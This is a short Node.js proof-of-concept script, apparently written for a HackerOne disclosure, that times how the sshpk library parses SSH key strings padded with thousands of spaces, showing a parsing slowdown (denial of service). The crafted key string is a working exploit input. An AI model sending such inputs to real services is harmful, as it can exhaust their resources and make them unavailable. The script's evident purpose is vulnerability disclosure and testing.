const sshpk = require('sshpk');

poc(2000);
poc(20000);
poc(200000);

/** @param {number} size */
function poc(size) {
	// https://hackerone.com/reports/319593
	const pocKey = `ssh-rsa a${Array(size).join(' ')}x\nx`;

	console.log(`sshpk start parsing ...`);
	const startAt = Date.now();

	try {
		sshpk.parseKey(pocKey, 'ssh');
	} catch (error) {
		// console.error(error.stack);
	}

	console.log(`sshpk parse done! (${Date.now() - startAt} ms)`);
}
